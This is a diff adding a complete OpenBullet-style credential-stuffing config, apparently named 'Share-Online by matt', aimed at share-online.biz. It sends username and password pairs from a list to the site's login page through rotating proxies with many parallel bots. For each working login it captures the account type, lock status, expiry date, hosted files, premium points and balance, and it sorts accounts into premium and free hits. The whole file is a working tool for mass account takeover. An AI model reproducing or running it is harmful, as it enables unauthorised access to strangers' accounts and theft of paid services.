@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "Share-Online by matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-10T18:13:15.4797095+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.share-online.biz/user/login" 
+  CONTENT "user=<USER>&pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logged in as " 
+  KEYCHAIN Failure OR 
+    KEY ">* Login data invalid *</" 
+
+#Account_type PARSE "<SOURCE>" LR "<p class=\"p_r\">" "</p>" -> CAP "Account type" 
+
+#Lock_Status PARSE "<SOURCE>" LR "Lock-Status:" "</span>" -> VAR "Lock Status" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</p>" VALUE "" 
+  KEY "        <p class=\"p_r\">" VALUE "" 
+  KEY "<span class='red'>" VALUE "" 
+  "<Lock Status>" -> CAP "Lock Status" 
+
+#Valid_until PARSE "<SOURCE>" LR "Account valid until:" "<p class=\"p_l\">" -> VAR "Valid until" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</p>" VALUE "" 
+  KEY "        <p class=\"p_r\">" VALUE "" 
+  "<Valid until>" -> CAP "Valid until" 
+
+#Hosted_files PARSE "<SOURCE>" LR "Hosted files:" "<p class=\"p_l\">" -> VAR "Hosted files" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</p>" VALUE "" 
+  KEY "        <p class=\"p_r\">" VALUE "" 
+  "<Hosted files>" -> CAP "Hosted files" 
+
+#Premium_points PARSE "<SOURCE>" LR "\">(*)</span>:" "<p class=\"p_l\">" -> VAR "Premium points" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</p>" VALUE "" 
+  KEY "        <p class=\"p_r\">" VALUE "" 
+  KEY "        </p>" VALUE "" 
+  "<Premium points>" -> CAP "Premium points" 
+
+#Balance PARSE "<SOURCE>" LR "Current Balance <span class=\"sm\">(***)</span>:" ";" -> VAR "Balance" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</p>" VALUE "" 
+  KEY "        <p class=\"p_r\">" VALUE "" 
+  KEY "&" VALUE "" 
+  "<Balance>" -> CAP "Balance" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Premium" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Sammler" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "Sammler" 
+    KEY "<SOURCE>" DoesNotContain "Premium" 
+
